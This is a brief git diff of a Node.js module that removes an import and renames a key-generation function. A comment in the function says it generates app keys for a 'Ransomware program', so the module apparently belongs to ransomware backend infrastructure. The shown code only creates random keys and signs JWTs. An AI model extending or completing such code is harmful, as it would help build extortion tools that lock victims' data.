@@ -1,6 +1,5 @@
 'use strict'
 
-const App = require('./schemas/app');
 const Key = require('./schemas/key');
 const jwt = require('jsonwebtoken');
 const fs = require('fs');
@@ -11,7 +10,7 @@ const genToken = function(data) {
 	return jwt.sign(data, config.secret);
 };
 
-const generateAppKey = function(req, res) {
+const storePrivGenAppkey = function(req, res) {
 	//Generate an app key to send to the Ransomware program
 	let genAppKey = crypto.randomBytes(20).toString('hex');
 	//Create the JWT token
@@ -32,5 +31,5 @@ const generateAppKey = function(req, res) {
 };
 
 module.exports = {
-	generateAppKey
+	storePrivGenAppkey
 };
